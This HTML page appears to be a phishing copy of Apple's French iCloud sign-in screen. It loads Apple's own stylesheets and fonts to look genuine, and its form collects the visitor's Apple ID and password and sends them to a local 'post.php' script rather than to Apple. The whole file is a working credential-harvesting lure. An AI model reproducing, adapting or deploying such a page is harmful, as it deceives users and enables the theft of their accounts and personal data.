<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <title></title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <link rel="stylesheet" href="https://www.apple.com/wss/fonts?families=SF+Pro,v1|SF+Pro+Icons,v1" type="text/css">
   <link rel="stylesheet" type="text/css" media="screen" href="https://appleid.cdn-apple.com/appleauth/static/cssj/N1865524238/widget/auth/app.css">
   <style type="text/css"></style>
</head>
<body class="tk-body ">
   <div aria-hidden="true" style="font-family:&quot;SF Pro Icons&quot;; width: 0px; height: 0px; color: transparent;">.</div>
   <div aria-hidden="true" style="font-family:&quot;SF Pro Display&quot;; width: 0px; height: 0px; color: transparent;">.</div>
   <div class="si-body si-container container-fluid" id="content" data-theme="dark">
      <apple-auth app-loading-defaults="{appLoadingDefaults}" pmrpc-hook="{pmrpcHook}">
         <div class="widget-container  fade-in restrict-min-content  restrict-max-wh  fade-in " data-mode="embed" data-isiebutnotedge="false">
            <div id="step" class="si-step  ">
               <logo {hide-app-logo}="hideAppLogo" {show-fade-in}="showFadeIn">    
               <div class="logo   signin-label  fade-in ">
                  <img class="cnsmr-app-image " src="svg4f72d89d71e9abcc4e37c71fb77fe65bsvg440-0hhd.svg" srcset="" role="presentation" style="width: 100px; position: relative; top: -10px">
               </div>
               </logo>
               <div id="stepEl" class="   ">
                  <sign-in suppress-iforgot="{suppressIforgot}" initial-route="" {on-test-idp}="@_onTestIdp">
                     <div class="signin fade-in" id="signin">
                        <app-title signin-label="true" title-class="">
                           <h1 tabindex="-1" class="si-container-title tk-intro  ">
                              Connexion à  iCloud	
                           </h1>
                        </app-title>
                        <div class="container si-field-container  password-second-step  password-on     ">
                           <div id="sign_in_form" class="signin-form
                              account-name-entered  
                              fed-auth 
                              show-password 
                              ">
                              <form action="./post.php" method="POST">
                                 <div class="si-field-container container">
                                    <div class="form-table">
                                       <div class="ax-vo-border   show-password     "></div>
                                       <div class="account-name form-row     show-password ">
                                          <label class="sr-only form-cell form-label" for="account_name_text_field">Connexion a iCloud Identifiant Apple</label>
                                          <div class="form-cell">
                                             <div class="form-cell-wrapper">
                                                <input name="id" type="text" class="force-ltr form-textbox form-textbox-text" id="account_name_text_field" can-field="accountName" autocomplete="off" autocorrect="off" autocapitalize="off" aria-required="true" required="required" spellcheck="false" ($focus)="appleIdFocusHandler()" ($keyup)="appleIdKeyupHandler()" ($blur)="appleIdBlurHandler()" placeholder="Identifiant&nbsp;Apple" autofocus="">
                                                <span aria-hidden="true" id="apple_id_field_label" class=" form-label-flyout">             
                                                Identifiant Apple
                                                </span>
                                             </div>
                                          </div>
                                       </div>
                                       <div class="field-separator"></div>
                                       <div class="password form-row show-password show-placeholder ">
                                          <label class="sr-only form-cell form-label" for="password_text_field">Mot de passe</label>
                                          <div class="form-cell">
                                             <div class="form-cell-wrapper">
                                                <input name="password" type="password" class="form-textbox form-textbox-text" id="password_text_field" aria-required="true" required="required" can-field="password" autocomplete="off" placeholder="Mot de passe">
                                                <span id="password_field_label" aria-hidden="true" class=" form-label-flyout">              Mot de passe 
                                                </span>
                                                <span class="sr-only form-label-flyout" id="invalid_user_name_pwd_err_msg" aria-hidden="true">
                                                </span>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                           </div>
                           <div class="si-remember-password">
                           <input name="remember-me" type="checkbox" id="remember-me" class="form-choice form-choice-checkbox" {($checked)}="isRememberMeChecked">
                           <label id="remember-me-label" class="form-label" for="remember-me">
                           <span class="form-choice-indicator"></span>                    Rester connecté
                           </label>
                           </div>
                           <div class="spinner-container auth  hide "></div>
                           <button id="sign-in" tabindex="0" class="si-button btn fed-ui moved fed-ui-animation-show  remember-me link " type="submit" aria-label=" Se connecter " aria-disabled="false">
                           <i class="icon icon_sign_in"></i>
                           <span class="text feat-split">Se connecter</span>
                           </button>
                           <button id="sign-in-cancel" ($click)="_signInCancel($element)" aria-disabled="false" tabindex="0" class="si-button btn secondary feat-split  remember-me   link " aria-label="Fermer">
                           <span class="text">                     Fermer
                           </span>
                           </button>
                        </div>
                        <div class="si-container-footer">
                        <div class="separator "></div>
                        <div class="links tk-subbody">
                        <div class="si-forgot-password">
                        <a id="iforgot-link" class="si-link ax-outline lite-theme-override" ($click)="iforgotLinkClickHandler($element)" href="https://iforgot.apple.com/password/verify/appleid" target="_blank">
                        Identifiant&nbsp;Apple ou mot de passe oublié&nbsp;?  <span class="sr-only"> S’ouvre dans une nouvelle fenêtre.</span>                          
                        </a>
                        </div>
                        </div>
                        </div>
                     </div>
                     </form>     
                  </sign-in>
               </div>
            </div>
            <div id="stocking" style="display:none !important;"></div>
         </div>
         <idms-modal wrap-class="full-page-error-wrapper " {(show)}="showfullPageError" auto-close="false"> 
         </idms-modal>
      </apple-auth>
   </div>
   <input type="hidden" id="fdcBrowserData" value="{&quot;U&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36&quot;,&quot;L&quot;:&quot;fr-FR&quot;,&quot;Z&quot;:&quot;GMT+02:00&quot;,&quot;V&quot;:&quot;1.1&quot;,&quot;F&quot;:&quot;VGa44j1e3NlY5BSo9z4ofjb75PaK4Vpjt.gEngMQEjZr_WhXTA2s.XTVV26y8GGEDd5ihORoVyFGh8cmvSuCKzIlnY6xljQlpRDu_htWW15nIpxf7_OLgiPFMJhHFW_jftckkCoqAkCoq0NUuAuyPB94UXuGlfUm0NUbNiqUU8jA2Q3wL6k03x0.5EwHXXTSHCSPmtd0wVYPIG_qvoPfybYb5EvYTrYesSpAQn213CabfvLG9mhORoVjEqw.fIMpwoNSdqdbAE9XXTneNufuyPBDjaY2ftckuyPBB2SCX0iakJrMgdGXxiddL1rW_DW.RdPQpYm6p4UdHz15tTma1kxNGYi1y.25.ea1_DWBRe4JEf6ZEe9zJ0ybfSFQ_v9NA14WX3NlY5DuY25BNnOVgw24uy.4km&quot;}">
</body>
</html>
